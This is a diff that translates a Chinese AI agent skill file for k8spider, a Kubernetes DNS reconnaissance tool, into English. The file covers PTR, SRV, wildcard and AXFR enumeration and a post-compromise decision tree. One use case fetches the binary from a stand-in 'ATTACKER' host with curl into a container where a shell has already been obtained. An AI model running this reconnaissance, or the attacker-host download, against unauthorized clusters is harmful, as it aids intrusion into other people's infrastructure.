@@ -1,211 +1,215 @@
 ---
 name: k8spider
-description: "使用 k8spider 进行 Kubernetes 集群 DNS 服务发现与侦察。当需要低权限枚举 K8s 集群中的 Service、探测 DNS 服务、扫描网段 PTR/SRV 记录、尝试 AXFR 区域传输时使用。k8spider 仅需 DNS 访问权限即可发现集群内所有服务，无需 API Server 权限。涉及 K8s 服务发现、DNS 侦察、集群信息收集、PTR 扫描、SRV 枚举的场景使用此技能。当用户提到 k8spider、K8s DNS 枚举、集群服务扫描、DNS 区域传输时也应触发"
+description: "Use k8spider for Kubernetes cluster DNS service discovery and reconnaissance. Use when you need to enumerate Services in a K8s cluster with low privileges, probe DNS services, scan network segments for PTR/SRV records, or attempt AXFR zone transfers. k8spider only needs DNS access to discover every service inside the cluster, with no API Server access required. Use this skill for K8s service discovery, DNS reconnaissance, cluster information gathering, PTR scanning, and SRV enumeration scenarios. It should also trigger when the user mentions k8spider, K8s DNS enumeration, cluster service scanning, or DNS zone transfers"
+zh-signals: "使用 k8spider 通过 DNS 低权限枚举 Kubernetes 集群 Service，执行 PTR/SRV 扫描与 AXFR 区域传输。信号:k8spider,K8s DNS,服务发现,PTR/SRV,AXFR"
+when-to-use: >-
+  Use when enumerating Kubernetes Services via DNS with low privileges, scanning PTR/SRV records,
+  or attempting AXFR zone transfers on an authorized cluster.
 metadata:
-  tags: "k8spider,kubernetes,k8s,dns,service discovery,PTR,SRV,AXFR,recon,侦察,服务发现,集群扫描"
+  tags: "k8spider,kubernetes,k8s,dns,service discovery,PTR,SRV,AXFR,recon,reconnaissance,service discovery,cluster scanning"
   category: "tool"
 ---
 
-# K8Spider — Kubernetes DNS 服务发现
+# K8Spider — Kubernetes DNS Service Discovery
 
-k8spider 是一个基于 DNS 的 K8s 服务发现工具——**只需能访问集群 DNS，即可低权限枚举所有 Service**。无需 API Server Token，无需特殊权限，纯 DNS 查询搞定。
+k8spider is a DNS-based K8s service discovery tool — **it only needs access to the cluster DNS to enumerate all Services with low privileges**. No API Server token, no special permissions, pure DNS queries.
 
-项目地址：https://github.com/Esonhugh/k8spider
+Project URL: https://github.com/Esonhugh/k8spider
 
-## 第一步：直接运行（使用默认参数）
+## Step 1: Run directly (with default parameters)
 
-k8spider 会从 `/etc/resolv.conf` 自动读取 DNS 服务器地址，使用内置默认 CIDR。先直接跑：
+k8spider automatically reads the DNS server address from `/etc/resolv.conf` and uses built-in default CIDRs. Run it first:
 
 ```bash
 k8spider all
 ```
 
-如果有输出，说明默认参数命中了，直接进入分析环节。
+If there is output, the default parameters worked — go straight to the analysis phase.
 
-## 第二步：默认参数无结果时，手动收集网络信息
+## Step 2: Manually gather network information when the default parameters return nothing
 
-如果 `k8spider all` 没有发现任何信息，说明默认 CIDR 或 DNS 不对，需要从当前机器收集真实参数。
+If `k8spider all` finds nothing, the default CIDR or DNS is wrong, so collect the real parameters from the current machine.
 
-### 确定目标 CIDR（-c 参数）
+### Determine the target CIDR (-c parameter)
 
-CIDR 网段需要从当前容器的网络配置中提取：
+The CIDR segment must be extracted from the network configuration of the current container:
 
 ```bash
-# 方式 1：从环境变量获取（K8s 注入）
+# Method 1: get it from the environment variable (injected by K8s)
 echo $KUBERNETES_SERVICE_HOST
-# 返回的 IP 所在网段通常就是 Service CIDR 范围
+# The subnet of the returned IP is usually the Service CIDR range
 
-# 方式 2：从 IP 地址推断
-ip addr show  # 或 ifconfig
-# 找到容器自身 IP 和掩码，推断所在网段
+# Method 2: infer it from the IP address
+ip addr show  # or ifconfig
+# Find the container's own IP and mask, then infer the segment
 
-# 方式 3：从路由表推断
+# Method 3: infer it from the routing table
 ip route
-# 查看路由信息，推断集群网段范围
+# Inspect the routing information and infer the cluster segment range
 ```
 
-Pod 网段和 Service 网段通常是相邻的 /16，可从容器自身 IP 推断 Service CIDR 的可能范围。
+The Pod segment and the Service segment are usually adjacent /16s, so the possible Service CIDR range can be inferred from the container's own IP.
 
-### 确定并验证 DNS 服务器（-d 参数）
+### Determine and verify the DNS server (-d parameter)
 
-DNS 地址必须通过可靠方式找到并验证可用：
+The DNS address must be found through a reliable method and verified as working:
 
 ```bash
-# 方式 1：从 resolv.conf 读取（最可靠）
+# Method 1: read it from resolv.conf (the most reliable)
 cat /etc/resolv.conf
-# nameserver 行就是集群 DNS 地址
+# The nameserver line is the cluster DNS address
 
-# 方式 2：用 k8spider 自带命令定位
+# Method 2: locate it with the built-in k8spider command
 k8spider whereisdns
 
-# 验证 DNS 是否可达且响应
+# Verify that the DNS is reachable and responding
 nslookup kubernetes.default.svc.cluster.local <DNS_IP>
-# 或
+# or
 dig @<DNS_IP> kubernetes.default.svc.cluster.local
-# 有正常应答说明 DNS 可用
+# A normal answer means the DNS is usable
 ```
 
-验证通过后再指定 DNS 运行：
+Run it with the verified DNS:
 
 ```bash
 k8spider all -d <DNS_IP> -c <CIDR>
 ```
 
-## 核心命令
+## Core Commands
 
-### 全量扫描（推荐首选）
+### Full Scan (recommended first choice)
 
-一键跑完所有发现方式，获取最全面的服务列表：
+Run every discovery method in one shot to get the most complete service list:
 
 ```bash
-# 先用默认参数试
+# Try the default parameters first
 k8spider all
 
-# 默认不生效时，用手动收集的参数
+# When the defaults do not work, use the manually collected parameters
 k8spider all -c <CIDR> -d <DNS_IP>
 
-# 输出示例：
+# Example output:
 # [PTR] 10.43.0.10 -> dns-default.kube-system.svc.cluster.local
 # [PTR] 10.43.0.1 -> kube-dns.kube-system.svc.cluster.local
 # [SRV] _http._tcp.kubernetes.default.svc.cluster.local -> 10.43.0.1:443
 ```
 
-### PTR 记录扫描（反向 DNS）
+### PTR Record Scanning (reverse DNS)
 
-通过 IP 反查域名，逐 IP 扫描网段：
+Look up domains by IP and scan the segment IP by IP:
 
 ```bash
 k8spider ptr -c <CIDR>
 ```
 
-PTR 扫描的逻辑：对 CIDR 中每个 IP 发起反向 DNS 查询，K8s DNS 会返回 `svc-name.namespace.svc.cluster.local` 格式的域名，直接暴露服务名和命名空间。
+The logic of the PTR scan: issue a reverse DNS query for every IP in the CIDR, K8s DNS returns domains in the `svc-name.namespace.svc.cluster.local` format, directly exposing service names and namespaces.
 
-### SRV 记录枚举
+### SRV Record Enumeration
 
-查询 DNS SRV 记录发现服务端口：
+Query DNS SRV records to discover service ports:
 
 ```bash
 k8spider srv -c <CIDR> -z cluster.local
 ```
 
-### 通配符 DNS 查询
+### Wildcard DNS Querying
 
-利用 K8s DNS 的通配符解析特性发现服务：
+Exploit the wildcard resolution behavior of K8s DNS to discover services:
 
 ```bash
 k8spider wild -c <CIDR> -z cluster.local
 ```
 
-### AXFR 区域传输
+### AXFR Zone Transfer
 
-尝试 DNS 区域传输，一次获取整个 zone 的所有记录：
+Attempt a DNS zone transfer to obtain all records of the whole zone at once:
 
 ```bash
 k8spider axfr -z cluster.local -d <DNS_IP>
 ```
 
-注意：AXFR 通常被限制，但值得一试——如果成功，这是最快最全的方式。
+Note: AXFR is usually restricted, but it is worth trying — if it succeeds, this is the fastest and most complete method.
 
-### 同网段扫描
+### Same-Segment Scanning
 
-发现 DNS 服务所在子网的服务：
+Discover services in the subnet where the DNS service lives:
 
 ```bash
 k8spider neighbor -d <DNS_IP>
 ```
 
-### 子网计算与扫描
+### Subnet Calculation and Scanning
 
-自动计算 DNS 服务所在子网并扫描：
+Automatically calculate and scan the subnet where the DNS service lives:
 
 ```bash
 k8spider subnet -d <DNS_IP>
 ```
 
-### kube-state-metrics 解析
+### kube-state-metrics Parsing
 
-从 kube-state-metrics 端点提取服务信息：
+Extract service information from the kube-state-metrics endpoint:
 
 ```bash
 k8spider metrics
 ```
 
-## 全局选项
+## Global Options
 
-| 选项 | 说明 | 默认值 |
+| Option | Description | Default |
 |------|------|--------|
-| `-c` | 目标 CIDR 网段 | 内置默认值，视环境而定 |
-| `-z` | DNS zone 名称 | `cluster.local` |
-| `-d` | DNS 服务器地址 | 从 resolv.conf 读取 |
-| `-t` | 启用多线程 | 关闭 |
-| `-n` | 线程数 | 10 |
+| `-c` | Target CIDR segment | Built-in default, depends on the environment |
+| `-z` | DNS zone name | `cluster.local` |
+| `-d` | DNS server address | Read from resolv.conf |
+| `-t` | Enable multithreading | Off |
+| `-n` | Number of threads | 10 |
 
-## 使用场景
+## Use Cases
 
-### 场景 1：Pod 内使用（已拿到容器 shell）
+### Use Case 1: Inside a Pod (container shell already obtained)
 
 ```bash
-# 投递二进制到容器
+# Deliver the binary into the container
 curl -o /tmp/k8spider https://ATTACKER/k8spider && chmod +x /tmp/k8spider
 
-# 直接用默认参数跑
+# Run it with the default parameters
 /tmp/k8spider all
 
-# 没结果再收集网络信息手动指定
+# If there are no results, collect network information and specify it manually
 ```
 
-### 场景 2：通过 kubectl 使用
+### Use Case 2: Through kubectl
 
 ```bash
-# 在现有 Pod 中执行
+# Execute in an existing pod
 kubectl exec -it target-pod -- ./k8spider all
 
-# 或创建临时 Pod
+# Or create a temporary pod
 kubectl run k8spider --image=busybox --restart=Never -- \
   wget -O /tmp/k8spider URL && /tmp/k8spider all
 ```
 
-### 场景 3：远程使用（需 DNS 可达）
+### Use Case 3: Remote usage (requires reachable DNS)
 
 ```bash
-# 必须手动指定 -d 和 -c，远程环境下默认参数基本不适用
+# You must specify -d and -c manually; the defaults are basically useless in a remote environment
 k8spider all -c <CIDR> -d <DNS_IP> -z cluster.local
 ```
 
-## 决策树
+## Decision Tree
 
 ```
-进入容器后：
-├─ 第一步：k8spider all（直接用默认参数跑）
-├─ 有结果 → 分析输出，拿到服务列表
-├─ 无结果 → 收集网络信息
-│   ├─ 获取 CIDR：从 ip addr / ifconfig / 环境变量推断
-│   ├─ 获取 DNS：cat /etc/resolv.conf 或 k8spider whereisdns
-│   └─ 验证 DNS：nslookup kubernetes.default.svc.cluster.local <DNS_IP>
-├─ 用收集到的参数重跑：k8spider all -c <CIDR> -d <DNS_IP>
-├─ 想要端口信息 → k8spider srv
-├─ 赌一把全量 → k8spider axfr
-├─ 想快速发现 → k8spider neighbor / k8spider subnet
-├─ 有 metrics 端点 → k8spider metrics
-└─ 网段大、速度慢 → 加 -t -n 50 开多线程
+After getting into the container:
+├─ Step 1: k8spider all (run it with the default parameters)
+├─ Results present → analyze the output to get the service list
+├─ No results      → collect network information
+│   ├─ Get the CIDR: infer it from ip addr / ifconfig / environment variables
+│   ├─ Get the DNS: cat /etc/resolv.conf or k8spider whereisdns
+│   └─ Verify the DNS: nslookup kubernetes.default.svc.cluster.local <DNS_IP>
+├─ Rerun with the collected parameters: k8spider all -c <CIDR> -d <DNS_IP>
+├─ Want port information → k8spider srv
+├─ Gamble on a full transfer → k8spider axfr
+├─ Want fast discovery → k8spider neighbor / k8spider subnet
+├─ There is a metrics endpoint → k8spider metrics
+└─ The segment is large and it is slow → add -t -n 50 to enable multithreading
 ```
